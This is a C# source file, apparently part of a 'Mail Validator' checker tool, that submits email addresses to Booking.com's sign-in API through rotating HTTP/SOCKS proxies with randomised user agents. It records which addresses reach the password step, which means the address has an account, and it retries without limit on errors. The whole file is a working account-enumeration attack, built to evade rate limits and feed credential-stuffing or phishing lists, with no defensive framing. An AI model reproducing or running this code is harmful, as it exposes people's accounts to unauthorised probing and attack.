using System;
using Leaf.xNet;
using CheckerSimplefied;

namespace SC___Mail_Validator
{
    class BookingVM
    {
        public static void postRequests(string username)
        {
            Utilities.name = "Booking";
            for (; ; )
            {
                try
                {
                    if (Program.proxyType > 0)
                    {
                        Program.proxies = Program.PROXIES[new Random().Next(Program.PROXIES.Count)];
                    }
                    using (HttpRequest request = new HttpRequest())
                    {
                        switch ((int)((uint)Program.proxyType + ~(uint)1 + (uint)1))
                        {
                            case 0:
                                request.Proxy = HttpProxyClient.Parse(Program.proxies);
                                break;
                            case 1:
                                request.Proxy = Socks4ProxyClient.Parse(Program.proxies);
                                break;
                            case 2:
                                request.Proxy = Socks5ProxyClient.Parse(Program.proxies);
                                break;
                        }
                        request.KeepAlive = true;
                        request.ConnectTimeout = 2500;
                        request.IgnoreProtocolErrors = true;
                        AmelioratedWrapper.AddHeaderWithStyle(request, "User-Agent: " + Http.RandomUserAgent());
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Content-Type: application/json");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "X-Booking-Client: ap");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "origin: https://account.booking.com");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "referer: https://account.booking.com/sign-in");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "X-Requested-With: XMLHttpRequest");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Accept-Encoding: gzip, deflate, br");
                        AmelioratedWrapper.AddHeaderWithStyle(request, "Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");
                        string url = "https://account.booking.com/api/identity/authenticate/v1.0/enter/email/submit";
                        var response = request.Raw(HttpMethod.POST, url, (HttpContent)new StringContent("{\"identifier\":{\"type\":\"IDENTIFIER_TYPE__EMAIL\",\"value\":\"" + username + "\"}}")).ToString();
                        
                        if (response.Contains("STEP_SIGN_IN__PASSWORD"))
                        {
                            Utilities.saveHits(username);
                            break;
                        }
                        if (response.Contains("STEP_REGISTER__PASSWORD") || response.Contains("STEP_ENTER__EMAIL__EMAIL"))
                        {
                            Utilities.saveFail(username);
                            break;
                        }
                    }
                }
                catch (Exception)
                {
                    Utilities.catchRetry();
                }
            }
        }
    }
}
